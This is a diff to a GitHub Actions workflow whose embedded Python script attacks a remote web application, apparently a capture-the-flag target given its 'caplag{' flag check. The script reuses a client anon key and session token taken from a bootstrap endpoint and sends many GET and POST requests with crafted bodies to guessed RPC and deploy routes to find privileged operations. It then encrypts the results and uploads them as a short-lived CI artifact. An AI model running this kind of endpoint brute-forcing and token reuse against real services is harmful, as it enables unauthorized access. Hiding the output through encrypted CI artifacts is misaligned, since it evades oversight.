@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Discover same-origin routes behind valid preview header
+      - name: Probe RPC and product-operation routes behind preview context
         shell: bash
         run: |
           set -euo pipefail
@@ -30,38 +30,38 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import requests, pathlib, urllib.parse, concurrent.futures, json, itertools
+          import requests,pathlib,urllib.parse,json,itertools,concurrent.futures
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
-          out=pathlib.Path('package/out')
-          seed=requests.Session(); seed.headers['User-Agent']='Mozilla/5.0'
-          boot=seed.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json()
-          h={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project'],'User-Agent':'Mozilla/5.0'}
-          words=['deploy','deployment','deployments','deploys','release','releases','export','exports','inspector','inspect','inspection','actions','action','invoke','artifact','artifacts','publish','publisher','publishes','preview','previews','internal','admin','operator','control','runtime','server','reference','references','build','builds','project','projects','workspace','workspaces','flag','flags','secret','secrets','config','metadata','manifest','status','review','approval','final','production','enterprise','rollout','queue','jobs','job','target','targets','environment','environments','capability','capabilities','grant','scope','token','session']
-          tails=['','inspect','export','status','get','read','show','details','metadata','manifest','config','preview','release','production','internal','admin','final','review','approve','approval','publish','deploy','artifact','artifacts','flag','secret','secrets','action','invoke','open','current','latest','ref','reference','refs','references','target','targets','context','token','session','capability','grant','scope']
-          paths=set(['/api/actions/invoke','/api/receipts/redeem'])
-          for w in words:
-              paths.add('/api/'+w)
-              for t in tails:
-                  if t: paths.add('/api/'+w+'/'+t)
-          for a,b in itertools.product(['deploy','deployment','release','preview','export','inspect','inspector','publish','artifact','internal','admin','production','enterprise'],['export','inspect','status','details','metadata','manifest','config','flag','secrets','release','production','preview','current','latest','context','token','capability','grant','scope','review','approval']):
-              for sep in ['-','_']:
-                  paths.add('/api/'+a+sep+b)
-          paths=sorted(paths)
+          out=pathlib.Path('package/out'); seed=requests.Session(); seed.headers['User-Agent']='Mozilla/5.0'
+          boot=seed.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); refs=seed.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); mf=seed.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; ref='preview-8b11c'
+          h={'Accept':'application/json','Content-Type':'application/json','apikey':boot['client']['anonKey'],'Authorization':'Bearer '+boot['client']['session'],'X-Launchlet-Preview':boot['project'],'User-Agent':'Mozilla/5.0'}
+          names=['inspect_deploy','inspectDeploy','export_deploy','exportDeploy','deploy_export','get_deploy','get_deployment','get_preview_deploy','preview_deploy','release_deploy','publish_deploy','promote_deploy','finalize_deploy','approve_deploy','inspect_release','export_release','release_export','get_release','publish_release','promote_release','finalize_release','approve_release','get_preview_context','preview_context','get_deploy_context','deploy_context','inspect_artifact','export_artifact','get_artifact','production_deploy','enterprise_deploy','enterprise_rollout','final_review','production_readiness','get_flag','flag','export_flag']
+          paths=[]
+          rpcroot=boot['api']['dataApiBase'].rstrip('/')+'/rpc/'
+          for n in names: paths.append(rpcroot+n)
+          for root in ['/api/generate','/api/generation','/api/prototype','/api/prototypes','/api/prompt','/api/prompts','/api/promote','/api/finalize','/api/rollout','/api/publish','/api/release','/api/deploy']:
+            paths.append(root)
+            for t in ['preview','deploy','release','production','enterprise','export','inspect','final','finalize','promote','publish','rollout','approve','review','artifact','flag']:
+              paths.append(root+'/'+t)
+          bodies=[{}, {'workspaceId':boot['workspace'],'projectId':boot['project']},{'workspace_id':boot['workspace'],'project_id':boot['project']},{'deployRef':ref},{'deploy_ref':ref},{'ref':ref},{'build':mf['build']},{'receipt':mf['previewReceipt'],'project':boot['project']},{'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}]
           def probe(path):
-              u=urllib.parse.urljoin(base,path); results=[]
+            u=urllib.parse.urljoin(base,path); rr=[]
+            try:
+              g=requests.get(u,headers=h,timeout=7,allow_redirects=False)
+              if g.status_code!=404: rr.append({'path':path,'method':'GET','status':g.status_code,'body':g.text[:12000],'headers':dict(g.headers)})
+            except Exception: pass
+            for b in bodies:
               try:
-                  r=requests.get(u,headers=h,timeout=6,allow_redirects=False)
-                  if r.status_code!=404: results.append({'path':path,'method':'GET','status':r.status_code,'body':r.text[:12000],'headers':dict(r.headers)})
+                r=requests.post(u,headers=h,json=b,timeout=7,allow_redirects=False)
+                if r.status_code!=404:
+                  rr.append({'path':path,'method':'POST','sent':b,'status':r.status_code,'body':r.text[:12000],'headers':dict(r.headers)})
+                  if 'caplag{' in r.text: break
               except Exception: pass
-              try:
-                  r=requests.post(u,headers=h,json={},timeout=6,allow_redirects=False)
-                  if r.status_code!=404: results.append({'path':path,'method':'POST','status':r.status_code,'body':r.text[:12000],'headers':dict(r.headers)})
-              except Exception: pass
-              return results
+            return rr
           hits=[]
-          with concurrent.futures.ThreadPoolExecutor(max_workers=24) as ex:
-              for rs in ex.map(probe,paths): hits.extend(rs)
-          (out/'summary.json').write_text(json.dumps({'count':len(paths),'hits':hits},indent=2))
+          with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
+            for rs in ex.map(probe,paths): hits.extend(rs)
+          (out/'summary.json').write_text(json.dumps({'hits':hits},indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -77,6 +77,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-gated-discovery-encrypted
+          name: launchlet-part2-rpc-encrypted
           path: artifact/
           retention-days: 1
